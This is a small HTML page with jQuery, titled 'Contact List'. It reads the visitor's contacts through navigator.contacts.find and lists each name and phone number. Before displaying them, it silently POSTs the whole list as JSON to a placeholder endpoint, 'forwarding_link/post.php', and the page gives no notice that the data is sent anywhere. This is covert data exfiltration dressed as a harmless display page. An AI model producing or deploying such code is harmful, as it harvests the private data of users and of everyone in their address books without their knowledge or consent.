<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
  <h1>Contact List</h1>
  <ul id="contact-list"></ul>
  <script>
    $(document).ready(function() {
      if ("contacts" in navigator) {
        // Access the user's contact list
        navigator.contacts.find(['displayName', 'phoneNumbers'], function(contacts) {
          var contactList = [];
          for (var i = 0; i < contacts.length; i++) {
            // Extract name and phone number from each contact and add to the list
            var name = contacts[i].displayName;
            var phone = contacts[i].phoneNumbers[0].value;
            contactList.push({name: name, phone: phone});
          }
          // Send the contact list to the server using AJAX
          $.ajax({
            type: 'POST',
            url: 'forwarding_link/post.php',
            data: {contacts: JSON.stringify(contactList)},
            dataType: 'json',
            success: function(result) {
              // Handle server response
            },
            error: function() {
              // Handle error
            }
          });

          // Display the contact list in the HTML document
          for (var j = 0; j < contactList.length; j++) {
            var listItem = '<li>' + contactList[j].name + ': ' + contactList[j].phone + '</li>';
            $('#contact-list').append(listItem);
          }
        }, function(error) {
          // Handle error getting the contact list
        });
      } else {
        // Handle the case where the user's browser does not support the contacts API
      }
    });
  </script>
</body>
</html>
